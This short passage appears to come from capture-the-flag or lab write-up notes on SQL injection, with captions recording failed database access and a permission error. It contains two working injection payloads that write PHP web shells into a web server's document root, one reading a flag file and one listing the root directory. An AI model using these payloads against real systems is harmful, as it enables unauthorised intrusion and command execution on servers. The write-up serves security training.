...
`cn' union select "",'<?php system("cat /var/www/flag.txt"); ?>', "", "" into outfile '/var/www/html/shell2.php'-- -`
...
<figure><img src=".gitbook/assets/image (7) (1) (1).png" alt=""><figcaption><p>mysql access not working, continue on website</p></figcaption></figure>
...
<figure><img src=".gitbook/assets/image (8) (1) (1).png" alt=""><figcaption><p>PERMISSION DENIED</p></figcaption></figure>
...
`cn' union select "",'<?php system("`**`dir /`**`"); ?>',"", "", "" into outfile '/var/www/html/dashboard/`**`shell.php`**`'-- -`
